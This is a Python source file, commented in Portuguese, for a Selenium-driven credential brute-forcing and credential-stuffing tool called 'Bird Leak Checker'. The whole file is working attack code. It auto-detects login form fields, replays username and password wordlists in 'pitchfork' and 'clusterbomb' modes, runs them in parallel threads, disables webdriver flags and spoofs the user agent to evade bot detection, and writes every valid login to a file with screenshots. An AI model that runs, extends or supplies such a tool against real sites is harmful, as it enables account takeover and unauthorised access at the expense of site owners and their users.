#!/usr/bin/env python3
"""
Bird Leak Checker - Ferramenta de teste de credenciais com Selenium
Autor: Bird Security Tools
Versão: 2.0
"""

import argparse
import sys
import time
import logging
from datetime import datetime
from typing import Optional, Tuple, List, Dict, Any
from dataclasses import dataclass
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, 
    NoSuchElementException,
    ElementNotInteractableException,
    WebDriverException
)
from webdriver_manager.firefox import GeckoDriverManager

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('error.log', encoding='utf-8'),
        logging.StreamHandler(sys.stderr)
    ]
)
logger = logging.getLogger(__name__)

class AttackMode(Enum):
    PITCHFORK = "pitchfork"
    CLUSTERBOMB = "clusterbomb"

@dataclass
class FormFields:
    """Estrutura para armazenar campos do formulário"""
    login_field: Dict[str, str]
    password_field: Dict[str, str]
    submit_button: Dict[str, str]
    
    def __str__(self):
        return f"Login: {self.login_field}, Password: {self.password_field}, Submit: {self.submit_button}"

class PageAnalyzer:
    """Analisador inteligente de páginas de login"""
    
    # Padrões comuns para campos de formulário
    LOGIN_PATTERNS = [
        {"by": By.NAME, "patterns": ["username", "user", "login", "email", "usuario"]},
        {"by": By.ID, "patterns": ["username", "user", "login", "email", "usuario", "user_login"]},
        {"by": By.XPATH, "patterns": [
            "//input[@type='text' or @type='email'][contains(@name, 'user') or contains(@id, 'user')]",
            "//input[contains(@placeholder, 'usuário') or contains(@placeholder, 'login')]"
        ]}
    ]
    
    PASSWORD_PATTERNS = [
        {"by": By.NAME, "patterns": ["password", "pass", "senha", "pwd"]},
        {"by": By.ID, "patterns": ["password", "pass", "senha", "pwd", "user_password"]},
        {"by": By.XPATH, "patterns": [
            "//input[@type='password']",
            "//input[contains(@placeholder, 'password') or contains(@placeholder, 'senha')]"
        ]}
    ]
    
    SUBMIT_PATTERNS = [
        {"by": By.XPATH, "patterns": [
            "//button[@type='submit']",
            "//input[@type='submit']",
            "//button[contains(text(), 'Login') or contains(text(), 'Entrar') or contains(text(), 'Sign')]",
            "//*[contains(@class, 'btn-login') or contains(@class, 'btn-submit')]"
        ]},
        {"by": By.NAME, "patterns": ["submit", "login", "entrar"]},
        {"by": By.ID, "patterns": ["submit", "login", "btnLogin", "btn-submit"]}
    ]
    
    ERROR_PATTERNS = [
        # Padrões de texto comuns em mensagens de erro
        "invalid", "incorrect", "wrong", "erro", "inválido",
        "usuário", "senha", "credentials", "credenciais",
        "error", "alert", "danger", "warning", "failed",
        "tente novamente", "try again"
    ]
    
    @staticmethod
    def find_element(driver, patterns: List[Dict]) -> Optional[Tuple[Any, str]]:
        """Encontra elemento baseado em múltiplos padrões"""
        for pattern_set in patterns:
            by_method = pattern_set["by"]
            for pattern in pattern_set["patterns"]:
                try:
                    if by_method == By.XPATH:
                        element = driver.find_element(by_method, pattern)
                    else:
                        element = driver.find_element(by_method, pattern)
                    if element.is_displayed() and element.is_enabled():
                        return element, pattern
                except (NoSuchElementException, ElementNotInteractableException):
                    continue
        return None
    
    @staticmethod
    def detect_form_fields(driver) -> Optional[FormFields]:
        """Detecta automaticamente campos do formulário"""
        logger.info("Analisando página para detectar campos de login...")
        
        # Buscar campo de login
        login_result = PageAnalyzer.find_element(driver, PageAnalyzer.LOGIN_PATTERNS)
        if not login_result:
            return None
        login_element, login_pattern = login_result
        
        # Buscar campo de senha
        password_result = PageAnalyzer.find_element(driver, PageAnalyzer.PASSWORD_PATTERNS)
        if not password_result:
            return None
        password_element, password_pattern = password_result
        
        # Buscar botão de submit
        submit_result = PageAnalyzer.find_element(driver, PageAnalyzer.SUBMIT_PATTERNS)
        if not submit_result:
            return None
        submit_element, submit_pattern = submit_result
        
        # Determinar tipo de identificação
        def get_field_info(element, pattern):
            attributes = {
                'id': element.get_attribute('id'),
                'name': element.get_attribute('name'),
                'type': element.get_attribute('type'),
                'class': element.get_attribute('class')
            }
            
            # Determinar qual atributo foi usado para encontrar
            if 'id' in pattern.lower():
                return {'by': 'id', 'value': attributes['id']}
            elif 'name' in pattern.lower():
                return {'by': 'name', 'value': attributes['name']}
            else:
                return {'by': 'xpath', 'value': pattern}
        
        login_field = get_field_info(login_element, login_pattern)
        password_field = get_field_info(password_element, password_pattern)
        submit_field = get_field_info(submit_element, submit_pattern)
        
        return FormFields(login_field, password_field, submit_field)

class ResponseAnalyzer:
    """Analisador de respostas da página após tentativa de login"""
    
    @staticmethod
    def analyze_response(driver, original_url: str) -> Dict[str, Any]:
        """Analisa a resposta da página após tentativa de login"""
        response = {
            'redirected': False,
            'error_detected': False,
            'error_message': None,
            'error_type': None,
            'current_url': driver.current_url,
            'page_title': driver.title,
            'page_source': driver.page_source[:1000]  # Primeiros 1000 chars
        }
        
        # Verificar redirecionamento
        if driver.current_url != original_url:
            response['redirected'] = True
            logger.info(f"Redirecionamento detectado: {driver.current_url}")
        
        # Verificar alertas JavaScript
        try:
            alert = driver.switch_to.alert
            response['error_message'] = alert.text
            response['error_type'] = 'javascript_alert'
            response['error_detected'] = True
            alert.dismiss()
        except:
            pass
        
        # Procurar mensagens de erro no HTML
        error_selectors = [
            "//div[contains(@class, 'error')]",
            "//div[contains(@class, 'alert')]",
            "//span[contains(@class, 'error')]",
            "//p[contains(@class, 'error')]",
            "//*[contains(text(), 'error') or contains(text(), 'Error')]",
            "//*[contains(text(), 'invalid') or contains(text(), 'Invalid')]"
        ]
        
        for selector in error_selectors:
            try:
                elements = driver.find_elements(By.XPATH, selector)
                for element in elements:
                    if element.is_displayed() and element.text:
                        text = element.text.lower()
                        if any(error_word in text for error_word in PageAnalyzer.ERROR_PATTERNS):
                            response['error_message'] = element.text
                            response['error_type'] = 'html_element'
                            response['error_detected'] = True
                            break
            except:
                continue
        
        # Verificar mudanças no título da página
        if 'login' in driver.title.lower() or 'sign in' in driver.title.lower():
            response['error_detected'] = True
            response['error_type'] = 'page_title'
        
        # Verificar por elementos específicos de sucesso
        success_indicators = ['welcome', 'dashboard', 'profile', 'account']
        for indicator in success_indicators:
            if indicator in driver.page_source.lower():
                response['error_detected'] = False
                break
        
        return response

class LoginTester:
    """Classe principal para testar logins"""
    
    def __init__(self, args):
        self.args = args
        self.driver = None
        self.form_fields = None
        self.error_response = None
        self.successful_logins = []
        self.failed_attempts = 0
        self.total_attempts = 0
        
    def setup_driver(self):
        """Configura o driver do Firefox"""
        options = Options()
        
        if self.args.headless:
            options.add_argument("--headless")
        
        # Configurações para evitar detecção
        options.set_preference("dom.webdriver.enabled", False)
        options.set_preference('useAutomationExtension', False)
        options.set_preference("general.useragent.override", 
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0")
        
        # Desabilitar notificações
        options.set_preference("permissions.default.desktop-notification", 2)
        
        try:
            service = Service(GeckoDriverManager().install())
            self.driver = webdriver.Firefox(service=service, options=options)
            self.driver.set_page_load_timeout(30)
            logger.info("Driver do Firefox configurado com sucesso")
        except Exception as e:
            logger.error(f"Erro ao configurar driver: {e}")
            sys.exit(1)
    
    def navigate_to_url(self):
        """Navega para a URL especificada"""
        try:
            logger.info(f"Acessando URL: {self.args.url}")
            self.driver.get(self.args.url)
            time.sleep(3)  # Espera inicial para página carregar
            return True
        except Exception as e:
            logger.error(f"Erro ao acessar URL: {e}")
            return False
    
    def get_form_fields(self):
        """Obtém campos do formulário (automático ou manual)"""
        # Se campos manuais foram fornecidos
        manual_fields = self.get_manual_fields()
        if manual_fields:
            self.form_fields = manual_fields
            logger.info(f"Usando campos manuais: {self.form_fields}")
            return True
        
        # Tentar detecção automática
        self.form_fields = PageAnalyzer.detect_form_fields(self.driver)
        
        if self.form_fields:
            logger.info(f"Campos detectados automaticamente: {self.form_fields}")
            return True
        
        # Se não detectou, pedir campos manualmente
        logger.error("Não foi possível detectar campos automaticamente")
        self.print_field_help()
        return False
    
    def get_manual_fields(self) -> Optional[FormFields]:
        """Extrai campos manuais dos argumentos"""
        login_field = {}
        password_field = {}
        submit_field = {}
        
        # Campo de login
        if self.args.Lid:
            login_field = {'by': 'id', 'value': self.args.Lid}
        elif self.args.Lname:
            login_field = {'by': 'name', 'value': self.args.Lname}
        elif self.args.Ltype:
            login_field = {'by': 'type', 'value': self.args.Ltype}
        
        # Campo de senha
        if self.args.Pid:
            password_field = {'by': 'id', 'value': self.args.Pid}
        elif self.args.Pname:
            password_field = {'by': 'name', 'value': self.args.Pname}
        elif self.args.Ptype:
            password_field = {'by': 'type', 'value': self.args.Ptype}
        
        # Botão de submit
        if self.args.Bid:
            submit_field = {'by': 'id', 'value': self.args.Bid}
        elif self.args.Bname:
            submit_field = {'by': 'name', 'value': self.args.Bname}
        elif self.args.Btype:
            submit_field = {'by': 'type', 'value': self.args.Btype}
        
        if login_field and password_field and submit_field:
            return FormFields(login_field, password_field, submit_field)
        
        return None
    
    def print_field_help(self):
        """Exibe ajuda para campos manuais"""
        print("\n" + "="*60)
        print("DETECÇÃO AUTOMÁTICA FALHOU")
        print("="*60)
        print("\nPor favor, forneça os campos manualmente usando:")
        print("\nPara campo de LOGIN (escolha um):")
        print("  -Lid ID_DO_CAMPO     # Ex: -Lid username")
        print("  -Lname NAME_DO_CAMPO # Ex: -Lname user")
        print("  -Ltype TYPE_DO_CAMPO # Ex: -Ltype email")
        
        print("\nPara campo de SENHA (escolha um):")
        print("  -Pid ID_DO_CAMPO     # Ex: -Pid password")
        print("  -Pname NAME_DO_CAMPO # Ex: -Pname pass")
        print("  -Ptype TYPE_DO_CAMPO # Ex: -Ptype password")
        
        print("\nPara botão de SUBMIT (escolha um):")
        print("  -Bid ID_DO_BOTÃO     # Ex: -Bid submit")
        print("  -Bname NAME_DO_BOTÃO # Ex: -Bname login")
        print("  -Btype TYPE_DO_BOTÃO # Ex: -Btype submit")
        
        print("\nExemplo completo:")
        print("python bird-leak-checker.py -u http://site.com/login \\")
        print("  -Lid username -Pid password -Bid login-btn")
        print("="*60)
    
    def test_error_response(self):
        """Testa com credenciais inválidas para capturar resposta de erro"""
        logger.info("Testando com credenciais inválidas para análise de resposta...")
        
        # Gerar credenciais inválidas únicas
        fake_login = f"test_invalid_{int(time.time())}"
        fake_password = f"fake_pass_{random.randint(100000, 999999)}"
        
        try:
            # Preencher formulário
            self.fill_form(fake_login, fake_password)
            
            # Esperar pela resposta
            time.sleep(self.args.error_wait)
            
            # Analisar resposta
            self.error_response = ResponseAnalyzer.analyze_response(self.driver, self.args.url)
            
            if self.error_response['error_detected']:
                logger.info(f"Resposta de erro detectada: {self.error_response['error_type']}")
                if self.error_response['error_message']:
                    logger.info(f"Mensagem: {self.error_response['error_message'][:100]}...")
            else:
                logger.warning("Nenhuma resposta de erro clara detectada. Continuando...")
            
            return True
            
        except Exception as e:
            logger.error(f"Erro no teste de resposta: {e}")
            return False
    
    def fill_form(self, username: str, password: str):
        """Preenche o formulário com credenciais"""
        try:
            # Localizar e preencher campo de login
            login_element = self.find_element_by_info(self.form_fields.login_field)
            login_element.clear()
            login_element.send_keys(username)
            
            # Localizar e preencher campo de senha
            password_element = self.find_element_by_info(self.form_fields.password_field)
            password_element.clear()
            password_element.send_keys(password)
            
            # Localizar e clicar no botão de submit
            submit_element = self.find_element_by_info(self.form_fields.submit_button)
            submit_element.click()
            
            time.sleep(0.5)  # Pequena pausa após submit
            
        except Exception as e:
            logger.error(f"Erro ao preencher formulário: {e}")
            raise
    
    def find_element_by_info(self, field_info: Dict) -> Any:
        """Encontra elemento baseado nas informações do campo"""
        by_type = field_info['by']
        value = field_info['value']
        
        if by_type == 'id':
            return self.driver.find_element(By.ID, value)
        elif by_type == 'name':
            return self.driver.find_element(By.NAME, value)
        elif by_type == 'type':
            return self.driver.find_element(By.XPATH, f"//input[@type='{value}']")
        elif by_type == 'xpath':
            return self.driver.find_element(By.XPATH, value)
        else:
            raise ValueError(f"Tipo de campo não suportado: {by_type}")
    
    def check_login_success(self, original_url: str) -> bool:
        """Verifica se o login foi bem-sucedido"""
        response = ResponseAnalyzer.analyze_response(self.driver, original_url)
        
        # Lógica para determinar sucesso
        if response['redirected']:
            # Se redirecionou para uma página diferente do login
            if 'login' not in response['current_url'].lower():
                return True
        
        # Verificar por indicadores de sucesso na página
        success_indicators = [
            'logout', 'sair', 'minha conta', 'dashboard',
            'welcome', 'bem-vindo', 'profile', 'perfil'
        ]
        
        page_content = self.driver.page_source.lower() + " " + self.driver.title.lower()
        for indicator in success_indicators:
            if indicator in page_content:
                return True
        
        # Verificar ausência de erro
        if not response['error_detected']:
            # Verificar se ainda estamos na página de login
            if 'login' not in response['current_url'].lower():
                return True
        
        return False
    
    def test_credentials(self, username: str, password: str) -> Tuple[bool, str]:
        """Testa um par de credenciais"""
        try:
            self.total_attempts += 1
            
            logger.info(f"Testando: {username}:{password} (Tentativa {self.total_attempts})")
            
            # Navegar de volta para a página de login se necessário
            if self.driver.current_url != self.args.url:
                self.driver.get(self.args.url)
                time.sleep(2)
            
            # Preencher e submeter formulário
            self.fill_form(username, password)
            
            # Esperar pela resposta
            time.sleep(self.args.response_time)
            
            # Verificar se foi bem-sucedido
            success = self.check_login_success(self.args.url)
            
            if success:
                logger.info(f"SUCESSO! Credencial válida: {username}:{password}")
                self.successful_logins.append(f"{username}:{password}")
                
                # Salvar imediatamente
                with open('logins-sucesso.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{username}:{password}\n")
                
                # Tirar screenshot
                try:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"success_{username}_{timestamp}.png"
                    self.driver.save_screenshot(filename)
                    logger.info(f"Screenshot salvo: {filename}")
                except:
                    pass
                
                return True, "Sucesso"
            else:
                self.failed_attempts += 1
                return False, "Falha"
                
        except Exception as e:
            logger.error(f"Erro ao testar {username}: {e}")
            return False, f"Erro: {str(e)}"
    
    def run_pitchfork_attack(self, usernames: List[str], passwords: List[str]):
        """Executa ataque no modo pitchfork"""
        logger.info("Iniciando ataque PITCHFORK...")
        
        pairs = min(len(usernames), len(passwords))
        for i in range(pairs):
            if self.args.max_attempts and self.total_attempts >= self.args.max_attempts:
                logger.info("Limite máximo de tentativas atingido")
                break
                
            success, _ = self.test_credentials(usernames[i], passwords[i])
            
            # Throttle entre tentativas
            if i < pairs - 1:  # Não esperar após a última
                time.sleep(self.args.throttle)
    
    def run_clusterbomb_attack(self, usernames: List[str], passwords: List[str]):
        """Executa ataque no modo clusterbomb"""
        logger.info("Iniciando ataque CLUSTERBOMB...")
        
        for i, username in enumerate(usernames):
            if self.args.max_attempts and self.total_attempts >= self.args.max_attempts:
                logger.info("Limite máximo de tentativas atingido")
                break
                
            for j, password in enumerate(passwords):
                if self.args.max_attempts and self.total_attempts >= self.args.max_attempts:
                    break
                    
                success, _ = self.test_credentials(username, password)
                
                # Throttle entre tentativas
                if not (i == len(usernames) - 1 and j == len(passwords) - 1):
                    time.sleep(self.args.throttle)
    
    def run_parallel_attack(self, usernames: List[str], passwords: List[str], mode: AttackMode, max_workers: int = 3):
        """Executa ataque em paralelo (apenas para modo clusterbomb)"""
        if mode != AttackMode.CLUSTERBOMB:
            logger.warning("Ataque paralelo suportado apenas para modo CLUSTERBOMB")
            self.run_clusterbomb_attack(usernames, passwords)
            return
        
        logger.info(f"Iniciando ataque CLUSTERBOMB paralelo com {max_workers} workers...")
        
        credentials_to_test = []
        for username in usernames:
            for password in passwords:
                credentials_to_test.append((username, password))
        
        def test_wrapper(credential):
            username, password = credential
            # Cada thread precisa de seu próprio driver
            try:
                tester = LoginTester(self.args)
                tester.setup_driver()
                tester.navigate_to_url()
                tester.form_fields = self.form_fields
                success, message = tester.test_credentials(username, password)
                tester.driver.quit()
                return success, username, password, message
            except Exception as e:
                return False, username, password, str(e)
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(test_wrapper, cred) for cred in credentials_to_test[:100]]  # Limitar para teste
            
            for future in as_completed(futures):
                if self.args.max_attempts and self.total_attempts >= self.args.max_attempts:
                    executor.shutdown(wait=False)
                    break
                    
                success, username, password, message = future.result()
                if success:
                    logger.info(f"SUCESSO (paralelo): {username}:{password}")
                    self.successful_logins.append(f"{username}:{password}")
                    
                    with open('logins-sucesso.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{username}:{password}\n")
    
    def cleanup(self):
        """Limpeza e finalização"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("Driver finalizado")
            except:
                pass
        
        # Resumo final
        print("\n" + "="*60)
        print("RESUMO DA EXECUÇÃO")
        print("="*60)
        print(f"Total de tentativas: {self.total_attempts}")
        print(f"Credenciais válidas encontradas: {len(self.successful_logins)}")
        print(f"Tentativas falhas: {self.failed_attempts}")
        
        if self.successful_logins:
            print("\nCredenciais válidas:")
            for cred in self.successful_logins:
                print(f"  {cred}")
        
        print(f"\nLogs salvos em: error.log")
        print(f"Credenciais válidas salvas em: logins-sucesso.txt")
        print("="*60)

def parse_args():
    """Parse dos argumentos de linha de comando"""
    parser = argparse.ArgumentParser(
        description="Bird Leak Checker - Ferramenta de teste de credenciais com Selenium",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos de uso:
  # Modo pitchfork com listas
  python bird-leak-checker.py -u https://exemplo.com/login -l usuarios.txt -p senhas.txt --pitchfork
  
  # Modo clusterbomb com um único usuário/senha
  python bird-leak-checker.py -u https://exemplo.com/login --login admin --password admin123 --clusterbomb
  
  # Modo headless com campos manuais
  python bird-leak-checker.py -u https://exemplo.com/login -l users.txt -p pass.txt \\
    -Lid username -Pid password -Bid submit --headless
  
  # Com throttling personalizado
  python bird-leak-checker.py -u https://exemplo.com/login -l users.txt -p pass.txt -t 5 -s 3 --pitchfork
        """
    )
    
    # Argumentos obrigatórios
    parser.add_argument("-u", "--url", required=True, help="URL da página de login")
    
    # Listas de credenciais
    parser.add_argument("-l", "--login-file", dest="login_file", help="Arquivo com lista de logins")
    parser.add_argument("-p", "--password-file", dest="password_file", help="Arquivo com lista de senhas")
    
    # Credenciais únicas
    parser.add_argument("--login", help="Login único para teste")
    parser.add_argument("--password", help="Senha única para teste")
    
    # Campos manuais
    parser.add_argument("-Lid", help="ID do campo de login")
    parser.add_argument("-Lname", help="Name do campo de login")
    parser.add_argument("-Ltype", help="Type do campo de login")
    
    parser.add_argument("-Pid", help="ID do campo de senha")
    parser.add_argument("-Pname", help="Name do campo de senha")
    parser.add_argument("-Ptype", help="Type do campo de senha")
    
    parser.add_argument("-Bid", help="ID do botão de submit")
    parser.add_argument("-Bname", help="Name do botão de submit")
    parser.add_argument("-Btype", help="Type do botão de submit")
    
    # Configurações de tempo
    parser.add_argument("-t", "--throttle", type=float, default=3.0, 
                       help="Tempo (segundos) entre tentativas (padrão: 3)")
    parser.add_argument("-s", "--response-time", type=float, default=10.0,
                       help="Tempo (segundos) para esperar resposta (padrão: 10)")
    parser.add_argument("--error-wait", type=float, default=7.0,
                       help="Tempo (segundos) para esperar resposta de erro (padrão: 7)")
    
    # Modos de ataque
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--pitchfork", action="store_true", help="Modo pitchfork")
    mode_group.add_argument("--clusterbomb", action="store_true", help="Modo clusterbomb")
    
    # Opções adicionais
    parser.add_argument("--headless", action="store_true", help="Executar em modo headless")
    parser.add_argument("--max-attempts", type=int, help="Número máximo de tentativas")
    parser.add_argument("--parallel", type=int, default=1, 
                       help="Número de threads paralelas (apenas clusterbomb)")
    parser.add_argument("--proxy", help="Proxy no formato http://user:pass@host:port")
    parser.add_argument("--user-agent", help="User-Agent personalizado")
    
    return parser.parse_args()

def validate_args(args):
    """Valida os argumentos fornecidos"""
    # Verificar se temos credenciais
    if not args.login and not args.login_file:
        logger.error("É necessário fornecer --login ou -l/--login-file")
        return False
    
    if not args.password and not args.password_file:
        logger.error("É necessário fornecer --password ou -p/--password-file")
        return False
    
    # Verificar se arquivos existem
    if args.login_file:
        try:
            with open(args.login_file, 'r') as f:
                pass
        except FileNotFoundError:
            logger.error(f"Arquivo não encontrado: {args.login_file}")
            return False
    
    if args.password_file:
        try:
            with open(args.password_file, 'r') as f:
                pass
        except FileNotFoundError:
            logger.error(f"Arquivo não encontrado: {args.password_file}")
            return False
    
    # Validar URL
    if not args.url.startswith(('http://', 'https://')):
        logger.error("URL deve começar com http:// ou https://")
        return False
    
    return True

def load_wordlist(filename: str) -> List[str]:
    """Carrega lista de palavras de um arquivo"""
    words = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if word and not word.startswith('#'):  # Ignorar linhas vazias e comentários
                    words.append(word)
        logger.info(f"Carregadas {len(words)} palavras de {filename}")
    except Exception as e:
        logger.error(f"Erro ao carregar {filename}: {e}")
    
    return words

def main():
    """Função principal"""
    args = parse_args()
    
    if not validate_args(args):
        sys.exit(1)
    
    # Carregar credenciais
    if args.login:
        usernames = [args.login]
    else:
        usernames = load_wordlist(args.login_file)
    
    if args.password:
        passwords = [args.password]
    else:
        passwords = load_wordlist(args.password_file)
    
    if not usernames or not passwords:
        logger.error("Nenhuma credencial para testar")
        sys.exit(1)
    
    logger.info(f"Iniciando teste com {len(usernames)} usuários e {len(passwords)} senhas")
    
    # Inicializar tester
    tester = LoginTester(args)
    
    try:
        # Setup
        tester.setup_driver()
        
        if not tester.navigate_to_url():
            sys.exit(1)
        
        # Detectar campos
        if not tester.get_form_fields():
            sys.exit(1)
        
        # Testar resposta de erro
        if not tester.test_error_response():
            logger.warning("Continuando apesar do problema no teste de erro")
        
        # Executar ataque
        if args.pitchfork:
            if args.parallel > 1:
                logger.warning("Paralelismo não suportado para modo PITCHFORK")
            tester.run_pitchfork_attack(usernames, passwords)
        elif args.clusterbomb:
            if args.parallel > 1:
                tester.run_parallel_attack(usernames, passwords, AttackMode.CLUSTERBOMB, args.parallel)
            else:
                tester.run_clusterbomb_attack(usernames, passwords)
        
    except KeyboardInterrupt:
        logger.info("Interrompido pelo usuário")
    except Exception as e:
        logger.error(f"Erro crítico: {e}", exc_info=True)
    finally:
        tester.cleanup()

if __name__ == "__main__":
    main()
